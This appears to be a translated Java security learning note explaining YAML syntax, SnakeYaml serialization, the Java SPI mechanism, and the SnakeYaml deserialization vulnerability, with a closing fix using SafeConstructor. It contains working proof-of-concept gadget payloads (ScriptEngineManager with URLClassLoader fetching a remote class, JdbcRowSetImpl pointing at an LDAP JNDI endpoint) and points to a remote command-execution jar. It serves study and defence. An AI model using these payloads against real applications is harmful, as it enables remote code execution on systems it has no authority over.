# Java Security Learning—SnakeYaml Deserialization Vulnerability

Author: H3rmesk1t

Data: 2022.03.01

# YAML basic syntax
[YAML](https://zh.wikipedia.org/wiki/YAML), `YAML` is a recursive abbreviation for "YAML Ain’t a Markup Language" (`YAML` is not a markup language), a format that is highly readable and used to express data serialization, similar to `XML` but is more concise than `XML`.

The syntax of `YAML` is similar to other high-level languages, and can simply express data forms such as lists, hash tables, scalars, etc. It uses blank symbol indentation and has a lot of appearance-dependent feature. It is especially suitable for expressing or editing data structures, various configuration files, printing debugging content, and file outlines (for example: many email title formats are very similar to `YAML`).

## Format
 - [YAML is used specifically](https://www.yiibai.com/yaml), First of all, three formats are allowed in `YAML`, namely constant values, objects and arrays. For example:

```yaml
# means the url attribute value;
url: http://www.yiibai.com
# means the value of the server.host attribute;
server:
    host: http://www.yiibai.com
#Array, that means the server is [a,b,c]
server:
    - 120.168.0.21
    - 120.168.0.22
    - 120.168.0.23
#constant
pi: 3.14 #Define a value of 3.14
hasChild: true #Define a boolean value
name: 'Hello YAML' #Define a string
```

## Comments
 - The same format as the `properties` file, YAML` starts with `#` as comments and only line comments.
 - `YAML` basic format requirements:
   - Size-sensitive.
   - Use indentation to represent hierarchical relationships.
   - Indentation cannot use `TAB`, only spaces can be used and there is no requirement for the number of spaces. You only need to be left-aligned at the same level (generally `2` or `4` spaces).

## Object
 - The object is represented by a colon, the format is `key: value`. Please note that a space is added after the colon.
 - Indentation can be used to represent hierarchical relationships.

```yaml
key:
    demo1: val1
    demo2: val2
```
 - In a more complex object format, you can use a question mark plus a space to represent a complex `key`, and a colon plus a space to represent a value `value`.

```yaml
?
    - complexkey1
    - complexkey2
:
    - complexvalue1
    - complexvalue2
```
 - The attribute representing the object is an array `[complexkey1,complexkey2]`, and the corresponding value is also an array `[complexvalue1,complexvalue2]`.

## Array
 - Use a short horizontal line plus a space to represent an array item.

```yaml
demo:
    - val1
    - val2

or

-
    - val1
    - val2 # [[val1, val2]]
```

 - A relatively complex writing method, indicating that the `companies` attribute is an array, and each array element is composed of three attributes: `id`, `name`, and `price`; arrays can also be represented in a flow manner.

```yaml
companies:
    -
        id: 1
        name: company1
        price: 200W
    -
        id: 2
        name: company2
        price: 500W
```

## Constant
 - A variety of constant structures are provided in `YAML`, including: integers, floating point numbers, strings, NULL, dates, booleans, and time.

```yaml
boolean:
    - TRUE #true, True is OK
    - FALSE #false, False is OK
float:
    - 3.14
    - 6.8523015e+5 #Scientific notation method can be used
int:
    - 123
    - 0b1010_0111_0100_1010_1110 #Binary representation
null:
    nodeName: 'node'
    parent: ~ #Use ~ to represent null
string:
    - Ha ha
    - 'Hello world' #You can wrap special characters with double quotes or single quotes
    - newline
      newline2 # string can be split into multiple lines, each line will be converted into a space
date:
    - 2018-07-17 #Date must be in ISO 8601 format, i.e. yyyy-MM-dd
datetime:
    - 2018-07-17T19:02:31+08:00 #Time uses ISO 8601 format, use T connection between time and date, and finally use + represents the time zone
```

# SnakeYaml Introduction
`SnakeYaml` is a library in Java for parsing the `YAML` format. `SnakeYaml` is a complete `YAML1.1` specification Processor`, which supports `UTF-8`/`UTF-16`, supports serialization/deserialization of `Java` objects, and supports all types defined by `YAML`. And when deserializing, `YAML` calls the `setter` method containing attributes in the class.

# SnakeYaml Use
## Environment construction
Add the following content to the `pom.xml` file in the `Maven` project:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>org.example</groupId>
    <artifactId>JavaSec-Learn</artifactId>
    <version>1.0-SNAPSHOT</version>

    <dependencies>
        <dependency>
            <groupId>org.yaml</groupId>
            <artifactId>snakeyaml</artifactId>
            <version>1.27</version>
        </dependency>
    </dependencies>

    <properties>
        <maven.compiler.source>8</maven.compiler.source>
        <maven.compiler.target>8</maven.compiler.target>
    </properties>

</project>
```

## Common methods

```java
String dump(Object data)
Serialize Java objects into YAML strings.
void dump(Object data, Writer output)
Serialize Java objects into YAML streams.
String dumpAll(Iterator<? extends Object> data)
Serialize a series of Java objects into YAML strings.
void dumpAll(Iterator<? extends Object> data, Writer output)
Serialize a series of Java objects into a YAML stream.
String dumpAs(Object data, Tag rootTag, DumperOptions.FlowStyle flowStyle)
Serialize Java objects into YAML strings.
String dumpAsMap(Object data)
Serialize Java objects into YAML strings.
<T> T load(InputStream io)
Parses the only YAML document in the stream and generates the corresponding Java object.
<T> T load(Reader io)
Parses the only YAML document in the stream and generates the corresponding Java object.
<T> T load(String yaml)
Parses the unique YAML document in the string and generates the corresponding Java object.
Iterable<Object> loadAll(InputStream yaml)
Parses all YAML documents in the stream and generates corresponding Java objects.
Iterable<Object> loadAll(Reader yaml)
Parses all YAML documents in the string and generates corresponding Java objects.
Iterable<Object> loadAll(String yaml)
parse all YAML documents in strings,
And generate the corresponding Java object.
```

## Serialization and deserialization
The basic usage of `SnakeYmal` was mentioned above, and here is the code to demonstrate:

 - Demo Class

```java
package org.h3rmesk1t.SnakeYaml;

/**
 * @Author: H3rmesk1t
 * @Data: 2022/3/1 1:04 am
 */
public class Demo {

    String name;

    public String getName() {
        return name;
    }

    public void setName(java.lang.String name) {
        this.name = name;
    }
}
```

 - SerDemo Class

```java
package org.h3rmesk1t.SnakeYaml;

import org.yaml.snakeyaml.Yaml;

/**
 * @Author: H3rmesk1t
 * @Data: 2022/3/1 1:11 am
 */
public class SerDemo {

    public static void main(String[] args) {

        Demo name = new Demo();
        name.setName("h3rmesk1t");
        Yaml yaml = new Yaml();
        String yamlString = yaml.dump(name);
        System.out.println(yamlString);
    }
}
```

 - Serialized output result:

```yaml
!!org.h3rmesk1t.SnakeYaml.Demo {name: h3rmesk1t}
```

<div align=center><img src="./images/1.png"></div>

You can see that in the output yaml format, there is `!!`, here `!!` is used to force type conversion, `!!org.h3rmesk1t.SnakeYaml.Demo` is to convert the object to the `org.h3rmesk1t.SnakeYaml.Demo` class. If there is no `!`, it is a `Map` with a `key` string. In fact, this is similar to `Fastjson`'s `@type`, and is used to specify the full class name of deserialization.

 - UnserDemo class

```java
package org.h3rmesk1t.SnakeYaml;

import org.yaml.snakeyaml.Yaml;

/**
 * @Author: H3rmesk1t
 * @Data: 2022/3/1 1:20 am
 */
public class UnserDemo {

    public static void main(String[] agrs) {

        String yamlString = "!!org.h3rmesk1t.SnakeYaml.Demo {name: h3rmesk1t}";
        Yaml yaml = new Yaml();
        Demo name = yaml.load(yamlString);
        System.out.println(name + " : " + name.getName());
    }
}
```

 - Deserialize output results:

<div align=center><img src="./images/2.png"></div>

# Java SPI mechanism
## Introduction
The `Java SPI` mechanism is a set of `APIs` provided by `Java` for implementation or extension by third parties. It can be used to start framework extensions and replace components. Common `SPI` include `JDBC`, `Spring`, `Spring Boot` related `starter` components, `Dubbo`, `JNDI`, log interfaces, etc.
  
Introduction to use:
 - When the service provider provides a specific implementation of the interface, create a file named "package name + interface name" in the `META-INF/services` directory of the `jar` package, and the content is the name of the class that implements the interface.
 - The `jar` package where the interface implementation class is located is placed in the `classpath` of the main program.
 - The main program dynamically loads the implementation module through `java.util.ServiceLoder`, finds the class name of the implementation class through the configuration file in the `META-INF/services` directory, and dynamically loads the class into `JVM` using reflection.

<div align=center><img src="./images/3.png"></div>

## How to use it
After running `SPIMain`, `Serviceloader` will get the class name that implements the interface according to the configuration file `META-INF/services/SPI.IShout`, instantiate it and return it to `IShout`, and finally call the `shout` method of each class instance.

 - SPI.IShout
```java
package SPI;

public interface IShout {
    void shout();
}
```

 - SPI.Web
```java
package SPI;

public class Web implements IShout {
    
    @Override
    public void shout() {
        System.out.println("Web");
    }
}
```

 - SPIMain
```java
package SPI;

import java.util.ServiceLoader;

public class SPIMain() {

    public class void main(String[] args) {
        
        ServiceLoader<IShout> shouts = ServiceLoad.load(IShout.class);
        for (IShout s : shouts) {
            s.shout();
        }
    }
}
```

## Process Analysis
Follow up on the `ServiceLoad.load(Class<S> service)` method, which first creates a `ClassLoader`, and then continues to call `ServiceLoad.load(Class<S> service, ClassLoader loader)`.

<div align=center><img src="./images/4.png"></div>

Then create a `ServiceLoader` object, follow up and call the `reload` method, and return an instance object of `LazyIterator`.

<div align=center><img src="./images/5.png"></div>

There are two parameters in the `LazyIterator` object, namely:
 - service: The name of the configuration file to be scanned.
 - loader: `ClassLoader` for the current thread.

When you start traversing this object, you call its `hasNext`, `hasNextService`, and `nextService` methods in `nextService`, and reflect the `Web` object and return to the `main` method for calling.

<div align=center><img src="./images/6.png"></div>

## Security Risk
When an attacker can write malicious implementation classes based on the interface class and can control the SPI configuration file in the META-INF/services directory in the `jar` package, the server will call the malicious implementation classes written by the attacker when it passes the `SPI` mechanism and cause arbitrary code to be executed.

# SnakeYaml Deserialization Vulnerability
## Vulnerable version
All versions of `SnakeYaml` can be exploited by deserialization vulnerabilities

## Vulnerability Principle
Since `SnakeYaml` is used to support deserialization of `Java` objects, when the parameters of the `Yaml.load` function are controllable, the attacker can pass in the `yaml` format serialization content of a malicious class, and use the server to deserialize the `yaml` data to achieve the exploitation of the `SnakeYaml` deserialization vulnerability.

## Gadgets
### ScriptEngineManager
#### Vulnerability Demo
First reproduce the vulnerability, the `POC` is as follows:

```java
package org.h3rmesk1t.SnakeYaml;

import org.yaml.snakeyaml.Yaml;

/**
 * @Author: H3rmesk1t
 * @Data: 2022/3/1 6:35 pm
 */
public class ScriptEngineManagerExploit {

    public static void main(String[] args) {

        String poc = "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\
"http://hfme12.dnslog.cn\"]]]]\n";
        Yaml yaml = new Yaml();
        yaml.load(poc);
    }
}
```

You can see that the `dnslog` request is successfully obtained in the figure below, but it only detects whether the deserialization has been performed. If it needs to be used, it also needs to construct the code for the command execution.

<div align=center><img src="./images/8.png"></div>

For the scripts for the above command execution, you can refer to [yaml-payload.jar](https://github.com/artsploit/yaml-payload/), which implements the `ScriptEngineFactory` interface, and then fill in the commands that need to be executed in the static code block, package the project and mount it to the `web` side, deserialize it with `payload` and then request it to this location, implement `java.net.URLClassLoader` to call a remote class to execute the command.

<div align=center><img src="./images/9.png"></div>

<div align=center><img src="./images/10.png"></div>

#### Vulnerability Analysis
Set a breakpoint at `yaml.load`, follow up to `this.constructor.getSingleData`, and call `this.constructDocument`.

<div align=center><img src="./images/11.png"></div>

Follow up on `this.constructDocument`, which calls `this.constructObject` to get an `Object` object, follow up on the method, and further call `this.constructObjectNoCheck`.

<div align=center><img src="./images/12.png"></div>

Follow up on the `constructObjectNoCheck` method.

<div align=center><img src="./images/13.png"></div>

Then follow up on the `construct.construct` method, here you will call `this.getConstructor`, and then follow up and find that you will continue to call `getClassForNode`. In this method, you get the value of `name` of `javax.script.ScriptEngineManager`, and then call `getClassForName` to pass in to get the `cl` class object.

Follow up on `getClassForName`, here using reflection to create a specific implementation of a `javax.script.ScriptEngineManager` object.

<div align=center><img src="./images/14.png"></div>

<div align=center><img src="./images/15.png"></div>

<div align=center><img src="./images/16.png"></div>

Then go back to the above, continue to follow up on the `construct`, and focus the focus in the `else` statement. This code creates an array of `array` and calls `node.getType.getDeclaredConstructors();`assigns to the `arr$` array. In the above analysis, the obtained `name`, that is, uses `javax.script.ScriptEngineManager` and `Class.forName` to create a reflective object and assign it to the `type` of `note`. Then call `getDeclaredConstructors` to get its parameterless constructor.

<div align=center><img src="./images/17.png"></div>

Then add the obtained `arr` array to `possibleConstructors`, and then assign the first array obtained by the obtained `possibleConstructors` and convert it into the `Constructor` type.

<div align=center><img src="./images/18.png"></div>

Then go back and traverse to get the value of `snode`, instantiate the object using reflection, and finally instantiate the `javax.script.ScriptEngineManager(java.lang.ClassLoader)` constructor, and then the analysis process of the `SPI` mechanism mentioned above.

<div align=center><img src="./images/19.png"></div>

### JdbcRowSetImpl
#### Vulnerability Demo
Use the classic `JdbcRowSetImpl` in `Fastjson` to successfully open it.

```java
package org.h3rmesk1t.SnakeYaml;

import org.yaml.snakeyaml.Yaml;

/**
 * @Author: H3rmesk1t
 * @Data: 2022/3/1 4:39 pm
 */
public class JdbcRowSetImplExploit {

    public static void main(String[] args) {

        String poc = "!!com.sun.rowset.JdbcRowSetImpl\n dataSourceName: \"ldap://127.0.0.1:1389/dx2zdj\"\n autoCommit: true";
        Yaml yaml = new Yaml();
        yaml.load(poc);
    }
}
```

<div align=center><img src="./images/7.png"></div>

#### Vulnerability Analysis
In short, when `SnakeYaml` is called deserialization of `Yaml.load`, it will call the `setter` method of `dataSourceName` property of `JdbcRowSetImpl` class, i.e. `setDataSourceName`, and then trigger a subsequent series of utilization chains to finally achieve the purpose of arbitrary code execution.

### Others Gadgets
Let’s go first, wait until I understand the relevant knowledge points later, and then add them. [Reference article](https://www.mi1k7ea.com/2019/11/29/Java-SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#:~:text=Spring%20PropertyPathFactoryBean).

## Vulnerability Fix
 - The `Yaml.load` parameter is prohibited from being controlled.
 - If deserialization is required, the parameter content needs to be filtered and the deserialized content is whitelisted using `SafeConstructor`.

```java
package org.h3rmesk1t.SnakeYaml;

import org.yaml.snakeyaml.Yaml;

public class ScriptEngineManagerExploit {

    public static void main(String[] args) {

        String poc = "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://hfme12.dnslog.cn\"]]]]\n";
        Yaml yaml = new Yaml(new SafeConstructor());
        yaml.load(poc);
    }
}
```